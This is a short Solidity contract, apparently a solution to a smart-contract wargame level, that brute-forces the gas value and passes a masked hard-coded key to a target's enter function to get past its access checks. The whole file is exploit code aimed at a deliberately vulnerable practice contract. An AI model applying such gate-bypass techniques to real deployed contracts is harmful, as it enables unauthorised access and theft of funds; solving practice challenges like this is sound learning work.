// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GateOneAttack {
    address public target;
    bytes8 public key = bytes8(0x40691132F407EE95) & 0xFFFFFFFF0000FFFF;

    constructor(address _targetAddr) {
        target = _targetAddr;
    }

    function attack() external {
        uint256 multiple = 8191;
        for (uint256 i = 0; i < multiple; i++) {
            (bool success, ) = target.call{gas: 100000 + i}(
                abi.encodeWithSignature("enter(bytes8)", key)
            );
            if (success) {
                break;
            }
        }
    }
}
